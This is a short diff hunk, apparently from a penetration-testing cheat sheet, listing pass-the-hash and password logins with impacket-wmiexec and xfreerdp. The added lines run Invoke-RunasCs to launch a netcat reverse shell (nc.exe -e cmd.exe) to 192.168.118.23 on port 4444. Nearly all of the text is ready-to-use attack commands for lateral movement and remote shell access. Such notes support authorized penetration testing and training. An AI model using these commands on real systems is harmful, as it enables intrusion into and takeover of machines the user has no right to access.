@@ -20,4 +20,7 @@ impacket-wmiexec <domain>/<user>@<target-ip> -hashes
 xfreerdp /v:<ip> /u:<user> /pth:<hash> /d:<domain>
 xfreerdp /v:<ip> /u:<user> /p:<pass> /d:<domain>
 
+#Invoke RunAS
+import-module .\Invoke-RunasCs.ps1
+Invoke-RunasCs <username> <password> 'c:\tmp\nc.exe 192.168.118.23 4444 -e cmd.exe'
 ```
